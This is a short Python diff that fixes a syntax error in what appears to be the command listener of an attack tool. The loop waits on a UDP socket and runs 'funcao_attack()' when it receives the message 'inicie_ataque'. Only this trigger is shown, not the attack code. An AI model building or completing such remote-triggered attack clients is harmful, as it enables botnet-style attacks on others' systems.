@@ -123,7 +123,7 @@ def escutando():
 	
 	while True:
 	    (data,addr) = mySocket.recvfrom(SIZE)
-            if data == 'inicie_ataque'
+            if data == 'inicie_ataque':
             	funcao_attack()
 
 
